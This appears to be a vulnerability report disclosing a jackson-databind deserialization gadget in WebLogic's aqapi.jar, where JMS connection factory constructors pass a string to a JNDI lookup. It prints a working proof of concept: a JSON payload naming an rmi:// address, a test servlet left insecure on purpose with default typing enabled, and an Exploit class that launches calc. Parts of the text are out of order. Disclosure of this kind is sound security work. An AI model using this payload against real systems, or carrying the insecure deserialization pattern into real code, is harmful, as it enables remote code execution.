Reporter: Fangrun Li (Cloud Security Team at Qihoo 360)
Received: 2020-04-24
---------------------------------------------------------------------------

In Weblogic 10.3.6 's default jar Middleware\wlserver_10.3\server\lib\aqapi.jar,
Seems Oracle Advanced Queue/JMSã€‚

(NOTE: jar itself found at

https://code.vt.edu/middleware/maven-repo/tree/9222c71c90cc5b2829261d1ab37ae86b466522a4/oracle/aqapi/11.1.1.2.0
)

https://community.oracle.com/message/376240?tstart=0

oracle.jms.AQjmsQueueConnectionFactory(java.lang.String)
oracle.jms.AQjmsXATopicConnectionFactory(java.lang.String)
oracle.jms.AQjmsTopicConnectionFactory(java.lang.String)
oracle.jms.AQjmsXAQueueConnectionFactory(java.lang.String)
oracle.jms.AQjmsXAConnectionFactory(java.lang.String)

Code Analysis
Five Class is same,chose AQjmsQueueConnectionFactory as example:
It has a constructor with only one String arg:

and arg will be transfer to InitialContext.lookup ,and could cause RCE with RMI.

I write a servlet for test:

package com.fnmsd;
import com.fasterxml.jackson.databind.ObjectMapper;
import javax.servlet.ServletException;

Exploit.java:

URL: http://127.0.0.1:7001/webtest-1.0-SNAPSHOT/TestJackson?json={%22object%22:
[%22oracle.jms.AQjmsQueueConnectionFactory%22,%22rmi://127.0.0.1:1234/aaaa%22]}
Result:

-----

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class TestJackson extends HttpServlet {

@Override
protected void service(HttpServletRequest request, HttpServletResponse response)
 throws ServletException, IOException {
    request.setCharacterEncoding("utf8");
    String jsonInput = request.getParameter("json");
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    mapper.readValue(jsonInput, User.class);
  }
}

import java.io.IOException;

public class Exploit {
  static {
    try {
      Runtime.getRuntime().exec("calc");
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public Exploit() {
    try {
      Runtime.getRuntime().exec("calc");
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}
